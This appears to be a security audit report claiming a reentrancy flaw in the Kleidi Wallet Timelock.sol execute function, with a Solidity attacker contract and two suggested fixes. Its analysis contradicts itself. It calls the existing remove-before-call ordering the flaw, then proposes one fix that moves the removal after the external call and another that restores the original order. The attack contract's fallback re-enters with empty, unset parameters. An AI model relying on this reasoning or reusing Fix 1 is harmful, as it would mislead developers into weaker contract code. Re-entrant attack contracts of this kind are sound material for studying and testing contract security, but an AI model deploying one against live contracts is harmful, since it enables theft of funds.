# Vulnerability details

## Summary

A critical vulnerability exists in the `Timelock.sol` contract of the **Kleidi Wallet** project, allowing a **reentrancy attack** through the improper handling of proposal state updates. Specifically, the removal of a proposal ID (`id`) from the `_liveProposals` set occurs **before** executing an external call. This sequence can be exploited by an attacker to manipulate the contract's state during the external call, leading to unauthorized actions and compromising the wallet's security.

## Vulnerability Details

### Improper State Mutation Before External Call

```solidity
function execute(
    address target,
    uint256 value,
    bytes calldata payload,
    bytes32 salt
) external payable whenNotPaused {
    bytes32 id = hashOperation(target, value, payload, salt);

    require(_liveProposals.remove(id), "Timelock: proposal does not exist");
    require(isOperationReady(id), "Timelock: operation is not ready");

    _execute(target, value, payload);

    emit CallExecuted(id, 0, target, value, payload);

    _afterCall(id);
}
```

**Explanation:**

- The proposal ID (`id`) is removed from `_liveProposals` **before** the external call to `_execute(target, value, payload)`.
- This premature state mutation opens a window where the contract's state is inconsistent, making it susceptible to reentrancy.

### External Call Execution Without Safeguards

```solidity
function _execute(address target, uint256 value, bytes calldata data)
    private
{
    (bool success,) = target.call{value: value}(data);
    require(success, "Timelock: underlying transaction reverted");
}
```

**Explanation:**

- The `_execute` function performs an external call to the `target` contract without any reentrancy protections.
- If the `target` is malicious, it can exploit the lack of safeguards to re-enter the `execute` function.

### Reentrancy via Malicious Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface ITimelock {
    function execute(address target, uint256 value, bytes calldata payload, bytes32 salt) external payable;
}

contract ReentrantAttack {
    ITimelock public timelock;
    address public owner;
    bytes32 public targetId;

    constructor(address _timelock) {
        timelock = ITimelock(_timelock);
        owner = msg.sender;
    }

    // Function to initiate the attack
    function attack(address target, uint256 value, bytes calldata payload, bytes32 salt) external {
        require(msg.sender == owner, "Only owner can attack");
        timelock.execute{value: value}(target, value, payload, salt);
    }

    // Fallback function to re-enter Timelock
    fallback() external payable {
        // Attempt to re-enter the execute function with the same parameters
        timelock.execute{value: 0}(address(this), 0, "", targetId);
    }

    receive() external payable {}
}
```

**Explanation:**

- The `ReentrantAttack` contract is designed to exploit the vulnerability by re-entering the `execute` function during the external call.
- Upon execution, the fallback function triggers another call to `execute`, manipulating the `_liveProposals` state.

## Impact

The identified vulnerability allows an attacker to perform a **reentrancy attack**, leading to:

- **Unauthorized State Manipulation:** By re-entering the `execute` function, an attacker can reschedule proposals or introduce unauthorized proposals.
- **Inconsistent Contract State:** The premature removal of `id` from `_liveProposals` can lead to inconsistent states, allowing multiple executions of the same proposal.
- **Loss of Funds:** Unauthorized actions could result in the loss or unauthorized transfer of funds managed by the Kleidi Wallet.
- **Undermined Security Guarantees:** The core security mechanisms of the Kleidi Wallet are compromised, eroding user trust and system integrity.

## Recommendations

To mitigate the identified vulnerability and enhance the security of the `Timelock.sol` contract, implement the following measures:

### 1. Implement Reentrancy Guards

Utilize OpenZeppelin's `ReentrancyGuard` to prevent multiple simultaneous invocations of sensitive functions.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Timelock is ReentrancyGuard {
    // Existing code...

    function execute(
        address target,
        uint256 value,
        bytes calldata payload,
        bytes32 salt
    ) external payable whenNotPaused nonReentrant {
        bytes32 id = hashOperation(target, value, payload, salt);

        require(isOperationReady(id), "Timelock: operation is not ready");

        _execute(target, value, payload);

        emit CallExecuted(id, 0, target, value, payload);

        require(_liveProposals.remove(id), "Timelock: proposal does not exist");
        _afterCall(id);
    }
}
```

**Explanation:**

- The `nonReentrant` modifier ensures that the `execute` function cannot be called multiple times in a single transaction, effectively preventing reentrancy attacks.

### 2. Adhere to Checks-Effects-Interactions Pattern

Ensure that all **checks** and **effects** (state mutations) occur **before** any **interactions** (external calls).

```solidity
function execute(
    address target,
    uint256 value,
    bytes calldata payload,
    bytes32 salt
) external payable whenNotPaused nonReentrant {
    bytes32 id = hashOperation(target, value, payload, salt);

    // Checks
    require(isOperationReady(id), "Timelock: operation is not ready");

    // Effects
    require(_liveProposals.remove(id), "Timelock: proposal does not exist");

    // Interactions
    _execute(target, value, payload);

    emit CallExecuted(id, 0, target, value, payload);

    _afterCall(id);
}
```

**Explanation:**

- By moving the state mutation (`_liveProposals.remove(id)`) **before** the external call (`_execute`), the window for reentrancy is minimized.
